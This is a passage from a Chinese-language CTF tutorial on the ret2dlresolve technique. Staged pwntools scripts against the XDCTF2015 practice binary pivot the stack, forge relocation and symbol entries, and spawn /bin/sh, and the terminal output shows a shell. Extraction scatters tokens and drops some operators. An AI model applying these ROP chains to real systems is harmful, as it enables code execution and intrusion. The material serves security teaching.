\nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write cmd=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nwrite_index\n \n=\n \n(\nelf\n.\nplt\n[\nwrite\n]\n \n-\n \nplt0\n)\n \n/\n \n16\n \n-\n \n1\n\n\nwrite_index\n \n*=\n \n8\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nwrite_index\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage2.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n123406\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 3\n\n\n\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002\n\n\n\u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 readelf -r main  \n\n\u91cd\u5b9a\u4f4d\u8282 \n.rel.dyn\n \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709 \n3\n \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n08049ffc  \n00000306\n R_386_GLOB_DAT    \n00000000\n   __gmon_start__\n0804a040  \n00000905\n R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044  \n00000705\n R_386_COPY        0804a044   stdout@GLIBC_2.0\n\n\u91cd\u5b9a\u4f4d\u8282 \n.rel.plt\n \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709 \n5\n \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n0804a00c  \n00000107\n R_386_JUMP_SLOT   \n00000000\n   setbuf@GLIBC_2.0\n0804a010  \n00000207\n R_386_JUMP_SLOT   \n00000000\n   read@GLIBC_2.0\n0804a014  \n00000407\n R_386_JUMP_SLOT   \n00000000\n   strlen@GLIBC_2.0\n0804a018  \n00000507\n R_386_JUMP_SLOT   \n00000000\n   __libc_start_main@GLIBC_2.0\n0804a01c  \n00000607\n R_386_JUMP_SLOT   \n00000000\n   write@GLIBC_2.0\n\n\n\n\n\u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n0x607\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nwrite_got\n)\n  \n# fake reloc\n\n\nrop\n.\nraw\n(\nr_info\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage3.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n126063\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 4\n\n\nstage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607\n8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 objdump -s -EL -j  .dynsym main\n\nmain\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nContents of section .dynsym:\n 80481d8 \n00000000\n \n00000000\n \n00000000\n \n00000000\n  ................\n 80481e8 \n33000000\n \n00000000\n \n00000000\n \n12000000\n  \n3\n...............\n 80481f8 \n27000000\n \n00000000\n \n00000000\n \n12000000\n  \n...............\n \n8048208\n \n52000000\n \n00000000\n \n00000000\n \n20000000\n  R........... ...\n \n8048218\n \n20000000\n \n00000000\n \n00000000\n \n12000000\n   ...............\n \n8048228\n 3a000000 \n00000000\n \n00000000\n \n12000000\n  :...............\n \n8048238\n 4c000000 \n00000000\n \n00000000\n \n12000000\n  L...............\n \n8048248\n 2c000000 44a00408 \n04000000\n 11001a00  ,...D...........\n \n8048258\n 0b000000 3c860408 \n04000000\n \n11001000\n  ....\n...........\n \n8048268\n 1a000000 40a00408 \n04000000\n 11001a00  ....@...........\n\n\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\nfake_write_sym\n \n=\n \nflat\n([\n0x4c\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u5177\u4f53\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage4.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n128795\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 5\n\n\n\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\n## plus 10 since the size of Elf32_Sym is 16.\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nfake_write_sym\n \n=\n \nflat\n([\nst_name\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\nwrite\n\\x00\n)\n  \n# there must be a \\x00 to mark the end of string\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage5.py      \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n129249\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 6\n\n\n\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\ndynsym\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynsym\n)\n.\nheader\n.\nsh_addr\n\n\ndynstr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.dynstr\n)\n.\nheader\n.\nsh_addr\n\n\n\n### making fake write symbol\n\n\nfake_sym_addr\n \n=\n \nbase_stage\n \n+\n \n32\n\n\nalign\n \n=\n \n0x10\n \n-\n \n((\nfake_sym_addr\n \n-\n \ndynsym\n)\n \n \n0xf\n\n                \n)\n  \n# since the size of item(Elf32_Symbol) of dynsym is 0x10\n\n\nfake_sym_addr\n \n=\n \nfake_sym_addr\n \n+\n \nalign\n\n\nindex_dynsym\n \n=\n \n(\n\n    \nfake_sym_addr\n \n-\n \ndynsym\n)\n \n/\n \n0x10\n  \n# calculate the dynsym index of write\n\n\n## plus 10 since the size of Elf32_Sym is 16.\n\n\nst_name\n \n=\n \nfake_sym_addr\n \n+\n \n0x10\n \n-\n \ndynstr\n\n\nfake_write_sym\n \n=\n \nflat\n([\nst_name\n,\n \n0\n,\n \n0\n,\n \n0x12\n])\n\n\n\n### making fake write relocation\n\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n(\nindex_dynsym\n \n \n8\n)\n \n|\n \n0x7\n\n\nfake_write_reloc\n \n=\n \nflat\n([\nwrite_got\n,\n \nr_info\n])\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n82\n)\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\nfake_write_reloc\n)\n  \n# fake write reloc\n\n\nrop\n.\nraw\n(\na\n \n*\n \nalign\n)\n  \n# padding\n\n\nrop\n.\nraw\n(\nfake_write_sym\n)\n  \n# fake write symbol\n\n\nrop\n.\nraw\n(\nsystem\n\\x00\n)\n  \n# there must be a \\x00 to mark the end of string\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nprint\n \nrop\n.\ndump\n()\n\n\nprint\n \nlen\n(\nrop\n.\nchain\n())\n\n\nrop\n.\nraw\n(\nsh\n \n+\n \n\\x00\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002\n\n\n0x0050:           \naara\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage6.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n130415\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:           \nbbbb\n \nbbbb\n\n0x000c:        0x804a892\n0x0010:           \nbbbb\n \nbbbb\n\n0x0014:           \nbbbb\n \nbbbb\n\n0x0018: \n\\x1c\\xa0\\x04\\x08\n \n\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00\n\n0x001c:  \n\\x07i\\x02\\x00\n\n0x0020:           \naaaa\n \naaaaaaaa\n\n0x0024:           \naaaa\n\n0x0028:  \n\\x00\n\\x00\\x00\n \n\\x00\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00\n\n0x002c: \n\\x00\\x00\\x00\\x00\n\n0x0030: \n\\x00\\x00\\x00\\x00\n\n0x0034: \n\\x12\\x00\\x00\\x00\n\n0x0038:           \nsyst\n \nsystem\\x00\n\n0x003c:        \nem\\x00o\n\n0x0040:             \naa\n\n0x0044:           \naaaa\n \naaaaaaaaaaaaaa\n\n0x0048:           \naaaa\n\n0x004c:           \naaaa\n\n0x0050:           \naara\n\n\n82\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh: \n1\n: xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py\n\n\n\n\n\u5de5\u5177\u653b\u51fb\n\n\n\u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \nroputils\n \nimport\n \n*\n\n\nfrom\n \npwn\n \nimport\n \nprocess\n\n\nfrom\n \npwn\n \nimport\n \ngdb\n\n\nfrom\n \npwn\n \nimport\n \ncontext\n\n\nr\n \n=\n 